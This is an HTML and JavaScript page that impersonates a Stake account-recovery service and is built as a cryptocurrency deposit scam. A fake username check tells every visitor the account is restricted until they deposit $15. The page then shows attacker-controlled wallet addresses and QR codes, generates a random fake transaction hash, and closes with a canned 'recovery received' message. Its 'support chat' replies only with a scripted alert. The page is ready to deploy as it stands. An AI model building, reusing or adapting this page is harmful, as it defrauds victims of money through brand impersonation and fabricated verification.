<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Stake Account Recovery</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }
    body {
      background: radial-gradient(circle at top left, #1a2a3b, #0f212e);
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      align-items: center;
      padding: 20px;
      transition: background 0.3s, color 0.3s;
    }
    .light-theme {
      background: #f0f0f0;
      color: #111;
    }
    .container {
      background: rgba(47, 69, 83, 0.9);
      backdrop-filter: blur(8px);
      padding: 25px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(2, 220, 5, 0.15);
      width: 100%;
      max-width: 480px;
      position: relative;
      z-index: 1;
      transition: background 0.3s;
    }
    .light-theme .container {
      background: #fff;
      color: #000;
    }
    .header {
      text-align: center;
      margin-bottom: 25px;
    }
    .header img {
      width: 120px;
      margin-bottom: 10px;
    }
    .header h2 {
      color: #02dc05;
      font-size: 1.8rem;
      font-weight: 600;
    }
    .form-group {
      margin-bottom: 15px;
    }
    label {
      font-weight: 500;
      margin-bottom: 6px;
      display: block;
    }
    input, select {
      width: 100%;
      padding: 10px;
      background: #11232f;
      border: 2px solid transparent;
      border-radius: 8px;
      color: #fff;
      font-size: 0.95rem;
      transition: border 0.3s;
    }
    .light-theme input, .light-theme select {
      background: #e5e5e5;
      color: #111;
    }
    input:focus, select:focus {
      border: 2px solid #02dc05;
      outline: none;
    }
    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background: #02dc05;
      color: #0f212e;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    button:hover {
      box-shadow: 0 0 10px #02dc05, 0 0 20px #02dc05;
    }
    .copy-btn, .save-btn {
      margin-top: 10px;
      background-color: #166ae0;
      color: #fff;
    }
    .message {
      font-size: 0.9rem;
      color: #00ff9d;
      margin-top: 8px;
    }
    #qr-code-container {
      text-align: center;
      margin-top: 15px;
    }
    #qr {
      margin: 10px auto;
    }
    #popup, #processing {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: rgba(47, 69, 83, 0.95);
      color: #fff;
      padding: 25px;
      border-radius: 14px;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
      z-index: 9999;
      animation: fadeIn 0.4s ease;
      max-width: 90%;
      text-align: center;
    }
    .blur {
      filter: blur(5px);
      pointer-events: none;
      user-select: none;
    }
    .theme-toggle {
      position: fixed;
      top: 20px;
      right: 20px;
      background: #02dc05;
      color: #0f212e;
      border: none;
      padding: 10px;
      border-radius: 50%;
      font-size: 1.2rem;
      cursor: pointer;
    }
    .chat-icon {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background-color: #02dc05;
      color: #0f212e;
      padding: 15px;
      border-radius: 50%;
      cursor: pointer;
      z-index: 999;
    }
    #chat-box {
      display: none;
      position: fixed;
      bottom: 80px;
      right: 20px;
      width: 260px;
      background: #1e2f3d;
      color: white;
      padding: 15px;
      border-radius: 12px;
      z-index: 1000;
      box-shadow: 0 0 10px #000;
    }
    #chat-box p {
      margin-bottom: 10px;
    }
    #chat-input {
      width: 100%;
      padding: 8px;
      margin-top: 10px;
      border-radius: 6px;
      border: none;
    }
    #chat-send {
      margin-top: 5px;
      background: #02dc05;
      color: #0f212e;
      width: 100%;
      border: none;
      border-radius: 6px;
      padding: 8px;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95) translate(-50%, -50%); }
      to { opacity: 1; transform: scale(1) translate(-50%, -50%); }
    }
  </style>
</head>
<body>
  <button class="theme-toggle" onclick="toggleTheme()">ðŸŒ“</button>

  <div id="main-content" class="container">
    <div class="header">
      <img src="stake-logo-white.png" alt="Stake Logo" />
      <h2>Account Recovery</h2>
    </div>

    <div class="form-group">
      <label for="username">Username</label>
      <input type="text" id="username" placeholder="Enter Stake Username" />
      <button onclick="verifyUsername()">Verify</button>
      <div class="message" id="verify-msg"></div>
    </div>

    <div class="form-group">
      <label for="coin">Select Coin</label>
      <select id="coin" onchange="updateAddress()">
        <option value="">--Select Coin--</option>
        <option value="usdt">USDT</option>
        <option value="btc">BTC</option>
        <option value="trx">TRX</option>
        <option value="eth">Ethereum</option>
      </select>
    </div>

    <div class="form-group">
      <label for="network">Select Network</label>
      <select id="network" onchange="updateAddress()">
        <option value="">--Select Network--</option>
        <option value="trc20">TRC20</option>
        <option value="bsc">BSC</option>
      </select>
    </div>

    <div class="form-group">
      <label for="address">Wallet Address</label>
      <input type="text" id="address" readonly />
      <button class="copy-btn" onclick="copyAddress()">Copy</button>
      <div id="qr-code-container">
        <canvas id="qr"></canvas>
        <button class="save-btn" onclick="saveQR()">Save QR</button>
      </div>
    </div>

    <div class="form-group">
      <label for="amount">Enter Amount (USD)</label>
      <input type="number" id="amount" />
    </div>

    <div class="form-group">
      <label for="screenshot">Upload Screenshot</label>
      <input type="file" id="screenshot" onchange="previewImage(event)" />
      <div id="img-preview"></div>
    </div>

    <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
  </div>

  <div id="processing"><p>Processing your request...</p></div>
  <div id="popup">
    <p>Your account recovery request has been received. Your Stake account will be fully active within 24 - 72 hours.</p>
    <button onclick="location.reload()">OK</button>
  </div>

  <div class="chat-icon" onclick="toggleChat()">ðŸ’¬</div>
  <div id="chat-box">
    <p><strong>Stake Support:</strong> Hi! How can we assist you today?</p>
    <input type="text" id="chat-input" placeholder="Type your message..." />
    <button id="chat-send" onclick="sendMessage()">Send</button>
  </div>

  <script>
    const addressMap = {
      usdt: { trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA', bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c' },
      btc: { bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c' },
      trx: { trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA', bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c' },
      eth: { bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c' }
    };

    const qr = new QRious({ element: document.getElementById('qr'), size: 140 });

    function updateAddress() {
      const coin = document.getElementById('coin').value;
      const network = document.getElementById('network').value;
      const addressField = document.getElementById('address');
      const helper = document.getElementById('verify-msg');
      if (coin && network && addressMap[coin] && addressMap[coin][network]) {
        const address = addressMap[coin][network];
        addressField.value = address;
        qr.value = address;
        if (coin === 'usdt' && network === 'trc20') {
          helper.innerText = 'Make sure to deposit only USDT via TRC20.';
        }
      } else {
        addressField.value = '';
        qr.value = '';
      }
      checkForm();
    }

    function verifyUsername() {
      const msg = document.getElementById('verify-msg');
      msg.innerHTML = 'Verifying...';
      setTimeout(() => {
        msg.innerHTML = 'Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.';
        navigator.vibrate?.(100);
      }, 1500);
    }

    function copyAddress() {
      const address = document.getElementById('address');
      address.select();
      address.setSelectionRange(0, 99999);
      navigator.clipboard.writeText(address.value);
      alert('Address copied!');
    }

    function saveQR() {
      const qrCanvas = document.getElementById('qr');
      const link = document.createElement('a');
      link.href = qrCanvas.toDataURL();
      link.download = 'qr-code.png';
      link.click();
    }

    function previewImage(event) {
      const preview = document.getElementById('img-preview');
      preview.innerHTML = '';
      const file = event.target.files[0];
      if (file) {
        const img = document.createElement('img');
        img.src = URL.createObjectURL(file);
        img.style.maxWidth = '100%';
        preview.appendChild(img);
        const hash = document.createElement('p');
        hash.innerText = 'Txn Hash: 0x' + Math.random().toString(36).substring(2, 15);
        preview.appendChild(hash);
      }
      checkForm();
    }

    function checkForm() {
      const username = document.getElementById('username').value;
      const coin = document.getElementById('coin').value;
      const network = document.getElementById('network').value;
      const address = document.getElementById('address').value;
      const amount = document.getElementById('amount').value;
      const screenshot = document.getElementById('screenshot').files.length;
      document.getElementById('submitBtn').disabled = !(username && coin && network && address && amount && screenshot);
    }

    function submitForm() {
      document.getElementById('processing').style.display = 'block';
      document.getElementById('main-content').classList.add('blur');
      setTimeout(() => {
        document.getElementById('processing').style.display = 'none';
        document.getElementById('popup').style.display = 'block';
      }, 4000); // 4 second delay
    }

    function toggleTheme() {
      document.body.classList.toggle('light-theme');
      alert('Theme toggled!');
    }

    function toggleChat() {
      const box = document.getElementById('chat-box');
      box.style.display = box.style.display === 'block' ? 'none' : 'block';
    }

    function sendMessage() {
      const input = document.getElementById('chat-input');
      const message = input.value.trim();
      if (message) {
        alert("Thanks for your message! Our support team will respond shortly.");
        input.value = '';
      }
    }
  </script>
</body>
</html>
